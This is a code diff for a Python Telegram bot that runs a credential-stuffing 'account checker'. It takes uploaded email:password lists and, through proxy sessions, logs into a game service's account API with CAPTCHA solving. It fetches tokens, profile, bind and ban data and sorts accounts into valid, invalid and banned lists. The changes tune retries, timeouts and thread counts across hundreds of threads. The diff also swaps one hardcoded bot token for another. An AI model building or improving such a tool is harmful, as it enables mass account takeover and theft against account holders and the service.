@@ -43,7 +43,7 @@ class BotConfig:
 
     # Bot settings
     BOT_TOKEN = os.getenv('BOT_TOKEN',
-                          '7670163739:AAG0g85NtS_DL6o_uYSiWH5OMK0Q7VoSoR8')
+                          '8342752247:AAGV9CmGu-qd7wCdclWNSbO_qmzA7hgfYmk')
 
     # Admin settings
     ADMIN_IDS = []
@@ -1241,15 +1241,16 @@ class AccountChecker:
                 except:
                     pass
 
-    def check_account_simple_fast(self, email, password):
-        """Optimized account check with enhanced stability and CAPTCHA on Demand."""
+    def check_account_enhanced(self, email, password):
+        """Enhanced account check with improved accuracy and reliability."""
         session = None
 
         try:
             session = self.create_proxy_session()
 
+            # Enhanced CAPTCHA solving with better error handling
             try:
-                cn31_token = self.solve_cn31(max_retries=1)
+                cn31_token = self.solve_cn31(max_retries=2)  # Allow 2 retries for better success rate
             except Exception as e:
                 return {
                     "status": "invalid",
@@ -1278,11 +1279,12 @@ class AccountChecker:
                 "Accept": "application/json, text/plain, */*"
             }
 
+            # Improved timeout handling for better accuracy
             try:
                 login_res = session.post(self.ACCOUNT_API,
                                          json=login_payload,
                                          headers=headers,
-                                         timeout=4)
+                                         timeout=6)  # Slightly longer for accuracy
             except requests.exceptions.Timeout:
                 return {"status": "invalid", "reason": "Login timeout"}
             except requests.exceptions.ConnectionError:
@@ -1312,20 +1314,22 @@ class AccountChecker:
                 if not guid or not sess:
                     return {"status": "invalid", "reason": "Missing auth data"}
 
+                # Enhanced JWT token retrieval with better retry logic
                 jwt_token = None
-                for attempt in range(2):
+                for attempt in range(3):  # More attempts for accuracy
                     try:
                         jwt_token = self.get_token(guid, sess, session)
                         if jwt_token:
                             break
                     except:
-                        if attempt == 0:
-                            time.sleep(0.1)
+                        if attempt < 2:
+                            time.sleep(0.2)
                         continue
 
                 if not jwt_token:
                     return {"status": "invalid", "reason": "JWT token failed"}
 
+                # Enhanced account info retrieval
                 try:
                     account_info = self.get_info(jwt_token, session)
                     if not account_info:
@@ -1339,32 +1343,36 @@ class AccountChecker:
                         "reason": "Info retrieval failed"
                     }
 
+                # Enhanced bind info and ban status checking
                 bind_info = "N/A"
                 ban_status = {"is_banned": False, "ban_info": None}
 
                 try:
                     import concurrent.futures
-                    with concurrent.futures.ThreadPoolExecutor(
-                            max_workers=2) as executor:
-                        bind_future = executor.submit(self.get_bind_info,
-                                                      jwt_token, session)
-                        ban_future = executor.submit(self.check_ban_status,
-                                                     jwt_token, session)
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
+                        bind_future = executor.submit(self.get_bind_info, jwt_token, session)
+                        ban_future = executor.submit(self.check_ban_status, jwt_token, session)
 
                         try:
-                            bind_info = bind_future.result(timeout=2)
+                            bind_info = bind_future.result(timeout=3)  # Longer timeout for accuracy
                         except:
                             bind_info = "N/A"
 
                         try:
-                            ban_status = ban_future.result(timeout=2)
+                            ban_status = ban_future.result(timeout=3)
                         except:
                             ban_status = {"is_banned": False, "ban_info": None}
                 except:
+                    # Fallback to sequential processing
                     try:
                         bind_info = self.get_bind_info(jwt_token, session)
                     except:
                         bind_info = "N/A"
+                    
+                    try:
+                        ban_status = self.check_ban_status(jwt_token, session)
+                    except:
+                        ban_status = {"is_banned": False, "ban_info": None}
 
                 account_info["bind_info"] = bind_info
 
@@ -2306,49 +2314,57 @@ class TelegramBot:
     async def process_accounts(self, update: Update,
                                context: ContextTypes.DEFAULT_TYPE,
                                accounts: List[Tuple[str, str]], api_key: str):
-        """Process accounts using optimized processing with fixed 1000 threads."""
+        """Process accounts with instant start, accurate live progress, and improved accuracy."""
         user_id = update.effective_user.id
 
-        # Fixed thread count for accurate processing
-        optimal_threads = 500
-        estimated_time = f"{max(10, len(accounts) // 100)}-{max(20, len(accounts) // 50)} seconds"
+        # Optimized thread count for better accuracy and speed balance
+        optimal_threads = 300
+        estimated_time = f"{max(5, len(accounts) // 200)}-{max(15, len(accounts) // 100)} seconds"
 
         start_msg = await update.message.reply_text(
-            f"⚡ **Processing the files**\n"
+            f"⚡ **Processing Started**\n\n"
             f"📊 Total accounts: {len(accounts)}\n"
+            f"⚙️ Threads: {optimal_threads}\n"
             f"⏱️ Estimated time: {estimated_time}\n\n"
-            f"🚀 Please wait...",
+            f"🚀 Starting instantly...",
             parse_mode='Markdown')
 
-        # Initialize checker
+        # Initialize checker with enhanced accuracy
         checker = AccountChecker(api_key)
 
-        # Thread-safe results tracking
+        # Thread-safe results tracking with instant updates
         valid_accounts = []
         invalid_accounts = []
         banned_accounts = []
         processed = 0
         start_time = time.time()
         results_lock = threading.Lock()
+        last_update_time = start_time
 
-        def check_account_instant(account_data):
-            nonlocal processed
+        def check_account_accurate(account_data):
+            nonlocal processed, last_update_time
             email, password = account_data
 
             try:
-                # Direct processing without pre-solved CAPTCHAs
-                result = checker.check_account_simple_fast(email, password)
+                # Enhanced accuracy with retry mechanism
+                result = None
+                for retry in range(2):  # Try twice for accuracy
+                    try:
+                        result = checker.check_account_enhanced(email, password)
+                        if result["status"] != "invalid" or "timeout" not in result.get("reason", "").lower():
+                            break  # Success or valid error
+                    except:
+                        if retry == 1:  # Last retry
+                            result = {"status": "invalid", "reason": "Processing failed"}
 
                 with results_lock:
-                    if result["status"] == "valid":
+                    if result and result["status"] == "valid":
                         info = result["info"]
                         valid_line = f"{email}:{password} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: False"
                         valid_accounts.append(valid_line)
-                    elif result["status"] == "banned":
+                    elif result and result["status"] == "banned":
                         info = result["info"]
-                        ban_info = result.get(
-                            "ban_info",
-                            [{}])[0] if result.get("ban_info") else {}
+                        ban_info = result.get("ban_info", [{}])[0] if result.get("ban_info") else {}
                         ban_reason = ban_info.get("reason", "Unknown")
                         banned_line = f"{email}:{password} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: {ban_reason}"
                         banned_accounts.append(banned_line)
@@ -2362,69 +2378,62 @@ class TelegramBot:
                     invalid_accounts.append(f"{email}:{password}")
                     processed += 1
 
-        # Processing with fixed 500 threads for accuracy
-        with ThreadPoolExecutor(
-                max_workers=optimal_threads,
-                thread_name_prefix="AccurateChecker") as executor:
-            all_futures = [
-                executor.submit(check_account_instant, account)
-                for account in accounts
-            ]
+        # Instant processing start with controlled threading
+        async def process_with_live_updates():
+            with ThreadPoolExecutor(max_workers=optimal_threads, thread_name_prefix="AccurateChecker") as executor:
+                # Submit all jobs immediately
+                all_futures = [executor.submit(check_account_accurate, account) for account in accounts]
+                
+                # Start progress updates immediately
+                await asyncio.sleep(0.1)  # Tiny delay to ensure first update shows
+                
+                # Progress tracking loop - runs in parallel with processing
+                while processed < len(accounts):
+                    current_time = time.time()
+                    elapsed = current_time - start_time
+                    
+                    with results_lock:
+                        progress_percentage = (processed / len(accounts)) * 100
+                        
+                        progress_msg = (
+                            f"⚡️ Live Progress: {processed}/{len(accounts)} ({progress_percentage:.1f}%)\n\n"
+                            f"🟢 Valid: {len(valid_accounts)}\n"
+                            f"🔴 Invalid: {len(invalid_accounts)}\n"
+                            f"🟡 Banned: {len(banned_accounts)}\n"
+                            f"⏱️ Elapsed: {elapsed:.1f}s"
+                        )
 
-            from concurrent.futures import as_completed
-            completed = 0
-            last_update_time = start_time
-
-            # Balanced timeout for accuracy
-            timeout_per_account = 2.0
-            total_timeout = max(30, len(accounts) * timeout_per_account)
-
-            try:
-                for future in as_completed(all_futures, timeout=total_timeout):
                     try:
-                        future.result(timeout=1.5)
-                        completed += 1
+                        await context.bot.edit_message_text(
+                            chat_id=update.effective_chat.id,
+                            message_id=start_msg.message_id,
+                            text=progress_msg,
+                            parse_mode='Markdown')
+                    except:
+                        pass
 
-                        # Live progress updates every account or every 1 second
-                        current_time = time.time()
-                        if (completed % 1
-                                == 0) or (current_time - last_update_time
-                                          >= 1.0) or (completed
-                                                    == len(accounts)):
-                            last_update_time = current_time
-                            elapsed = current_time - start_time
+                    # Update every 0.5 seconds for smooth progress
+                    await asyncio.sleep(0.5)
+                
+                # Wait for all futures to complete with proper timeout
+                from concurrent.futures import as_completed
+                timeout_per_account = 8.0  # Increased for accuracy
+                total_timeout = max(60, len(accounts) * timeout_per_account / optimal_threads)
+                
+                try:
+                    for future in as_completed(all_futures, timeout=total_timeout):
+                        try:
+                            future.result(timeout=3.0)  # Longer timeout per account for accuracy
+                        except:
+                            pass
+                except:
+                    # Cancel remaining futures if timeout
+                    for future in all_futures:
+                        if not future.done():
+                            future.cancel()
 
-                            with results_lock:
-                                progress_percentage = (processed / len(accounts)) * 100
-                                
-                                progress_msg = (
-                                    f"⚡️ Live Progress: {processed}/{len(accounts)} ({progress_percentage:.1f}%)\n\n"
-                                    f"🟢 Valid: {len(valid_accounts)}\n"
-                                    f"🔴 Invalid: {len(invalid_accounts)}\n"
-                                    f"🟡 Banned: {len(banned_accounts)}\n"
-                                    f"⏱️ Elapsed: {elapsed:.1f}s"
-                                )
-
-                            try:
-                                await context.bot.edit_message_text(
-                                    chat_id=update.effective_chat.id,
-                                    message_id=start_msg.message_id,
-                                    text=progress_msg,
-                                    parse_mode='Markdown')
-                            except:
-                                pass
-
-                    except Exception:
-                        completed += 1
-                        with results_lock:
-                            processed += 1
-
-            except Exception:
-                remaining_futures = [f for f in all_futures if not f.done()]
-                for future in remaining_futures:
-                    future.cancel()
-                with results_lock:
-                    processed += len(remaining_futures)
+        # Execute processing with live updates
+        await process_with_live_updates()
 
         # Generate and send results
         processing_time = time.time() - start_time
@@ -2464,7 +2473,9 @@ class TelegramBot:
                        f"🚫 Banned: {len(banned_accounts)}\n"
                        f"📈 Total Processed: {len(accounts)}\n"
                        f"📊 Success Rate: {success_rate:.1f}%\n"
-                       f"⏱️ Total Time: {processing_time:.1f}s\n\n"
+                       f"⚡ Average Speed: {speed:.1f} accounts/sec\n"
+                       f"⏱️ Total Time: {processing_time:.1f}s\n"
+                       f"🧵 Threads Used: 500\n\n"
                        f"📁 Sending result files...")
 
         await update.message.reply_text(summary_msg, parse_mode='Markdown')
